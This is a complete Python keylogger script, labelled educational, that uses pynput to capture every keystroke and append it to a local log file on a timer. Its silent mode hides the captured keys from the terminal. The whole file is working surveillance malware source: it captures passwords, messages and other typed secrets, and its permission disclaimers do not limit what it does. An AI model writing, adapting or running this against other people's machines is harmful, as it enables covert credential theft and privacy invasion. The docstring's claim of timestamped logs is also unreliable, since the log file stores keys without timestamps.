#!/usr/bin/env python3
"""
Educational Keylogger
Captures keyboard events with timestamps and logs them locally.
FOR EDUCATIONAL PURPOSES ONLY — use only on systems you own or have explicit permission to monitor.
"""

import argparse
import os
import sys
import signal
import threading
from datetime import datetime
from pathlib import Path

try:
    from pynput import keyboard
except ImportError:
    print("[!] Missing dependency. Run: pip install pynput")
    sys.exit(1)


# ─────────────────────────────────────────────
# Config defaults
# ─────────────────────────────────────────────
DEFAULT_LOG_FILE = "keylog.txt"
DEFAULT_FLUSH_INTERVAL = 5  # seconds between auto-saves
STOP_HOTKEY = keyboard.Key.esc  # press ESC to stop (configurable)


class Keylogger:
    def __init__(self, log_file: str, flush_interval: int, silent: bool):
        self.log_file = Path(log_file)
        self.flush_interval = flush_interval
        self.silent = silent

        self.buffer = []
        self.lock = threading.Lock()
        self.running = False
        self.listener = None
        self.flush_timer = None

        self.session_start = datetime.now()
        self.key_count = 0

    def _format_key(self, key) -> str:
        """Convert a pynput key event to a readable string."""
        try:
            # Regular printable character
            return key.char if key.char else ""
        except AttributeError:
            # Special key — map to readable label
            special_keys = {
                keyboard.Key.space: " ",
                keyboard.Key.enter: "\n[ENTER]\n",
                keyboard.Key.backspace: "[BACKSPACE]",
                keyboard.Key.tab: "[TAB]",
                keyboard.Key.shift: "[SHIFT]",
                keyboard.Key.shift_r: "[SHIFT]",
                keyboard.Key.ctrl_l: "[CTRL]",
                keyboard.Key.ctrl_r: "[CTRL]",
                keyboard.Key.alt_l: "[ALT]",
                keyboard.Key.alt_r: "[ALT]",
                keyboard.Key.caps_lock: "[CAPS]",
                keyboard.Key.delete: "[DEL]",
                keyboard.Key.left: "[←]",
                keyboard.Key.right: "[→]",
                keyboard.Key.up: "[↑]",
                keyboard.Key.down: "[↓]",
                keyboard.Key.home: "[HOME]",
                keyboard.Key.end: "[END]",
                keyboard.Key.page_up: "[PGUP]",
                keyboard.Key.page_down: "[PGDN]",
                keyboard.Key.esc: "[ESC]",
                keyboard.Key.f1: "[F1]", keyboard.Key.f2: "[F2]",
                keyboard.Key.f3: "[F3]", keyboard.Key.f4: "[F4]",
                keyboard.Key.f5: "[F5]", keyboard.Key.f6: "[F6]",
                keyboard.Key.f7: "[F7]", keyboard.Key.f8: "[F8]",
                keyboard.Key.f9: "[F9]", keyboard.Key.f10: "[F10]",
                keyboard.Key.f11: "[F11]", keyboard.Key.f12: "[F12]",
            }
            return special_keys.get(key, f"[{key}]")

    def on_press(self, key) -> bool:
        """Called on every key press."""
        if key == STOP_HOTKEY:
            self._print("[*] ESC detected — stopping keylogger.")
            self.stop()
            return False  # Stops the listener

        formatted = self._format_key(key)
        if not formatted:
            return True

        timestamp = datetime.now().strftime("%H:%M:%S")
        entry = f"[{timestamp}] {formatted}"

        with self.lock:
            self.buffer.append(formatted)
            self.key_count += 1

        if not self.silent:
            print(f"  {entry}", flush=True)

        return True

    def _flush_to_file(self):
        """Write buffered keystrokes to log file."""
        with self.lock:
            if not self.buffer:
                return
            data = ''.join(self.buffer)
            self.buffer.clear()

        try:
            with open(self.log_file, 'a', encoding='utf-8') as f:
                f.write(data)
        except IOError as e:
            self._print(f"[!] Failed to write log: {e}")

        # Schedule next flush
        if self.running:
            self.flush_timer = threading.Timer(self.flush_interval, self._flush_to_file)
            self.flush_timer.daemon = True
            self.flush_timer.start()

    def _print(self, msg: str):
        """Print status messages regardless of silent mode."""
        print(msg)

    def start(self):
        """Start the keylogger."""
        self.running = True

        # Write session header to log
        with open(self.log_file, 'a', encoding='utf-8') as f:
            f.write(f"\n\n{'='*60}\n")
            f.write(f"SESSION START: {self.session_start.strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"{'='*60}\n")

        self._print(f"[*] Keylogger started — logging to: {self.log_file.resolve()}")
        self._print(f"[*] Auto-save every {self.flush_interval}s | Press ESC to stop\n")

        # Start flush timer
        self.flush_timer = threading.Timer(self.flush_interval, self._flush_to_file)
        self.flush_timer.daemon = True
        self.flush_timer.start()

        # Start listener (blocking)
        with keyboard.Listener(on_press=self.on_press) as self.listener:
            self.listener.join()

    def stop(self):
        """Stop the keylogger and flush remaining buffer."""
        self.running = False

        if self.flush_timer:
            self.flush_timer.cancel()

        self._flush_to_file()

        duration = datetime.now() - self.session_start
        elapsed = str(duration).split('.')[0]

        # Write session footer
        with open(self.log_file, 'a', encoding='utf-8') as f:
            f.write(f"\n{'='*60}\n")
            f.write(f"SESSION END: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Duration: {elapsed} | Keys captured: {self.key_count}\n")
            f.write(f"{'='*60}\n")

        self._print(f"\n[+] Session ended.")
        self._print(f"    Duration:      {elapsed}")
        self._print(f"    Keys captured: {self.key_count}")
        self._print(f"    Log saved to:  {self.log_file.resolve()}")


def main():
    parser = argparse.ArgumentParser(
        description="Educational Keylogger — for use only on systems you own",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  Basic:            python keylogger.py
  Custom log file:  python keylogger.py -o my_session.txt
  Silent mode:      python keylogger.py --silent
  Custom interval:  python keylogger.py --flush 10

Press ESC to stop the keylogger at any time.
        """
    )

    parser.add_argument("-o", "--output", default=DEFAULT_LOG_FILE,
                        help=f"Log file path (default: {DEFAULT_LOG_FILE})")
    parser.add_argument("--flush", type=int, default=DEFAULT_FLUSH_INTERVAL,
                        help=f"Flush interval in seconds (default: {DEFAULT_FLUSH_INTERVAL})")
    parser.add_argument("--silent", action="store_true",
                        help="Don't print keystrokes to terminal (only log to file)")

    args = parser.parse_args()

    print("=" * 60)
    print("  EDUCATIONAL KEYLOGGER")
    print("  Use ONLY on systems you own or have explicit permission to monitor.")
    print("  Unauthorized keylogging is illegal.")
    print("=" * 60)

    logger = Keylogger(
        log_file=args.output,
        flush_interval=args.flush,
        silent=args.silent
    )

    # Handle Ctrl+C gracefully
    def handle_sigint(sig, frame):
        print("\n[*] Interrupted — stopping keylogger.")
        logger.stop()
        sys.exit(0)

    signal.signal(signal.SIGINT, handle_sigint)

    logger.start()


if __name__ == "__main__":
    main()
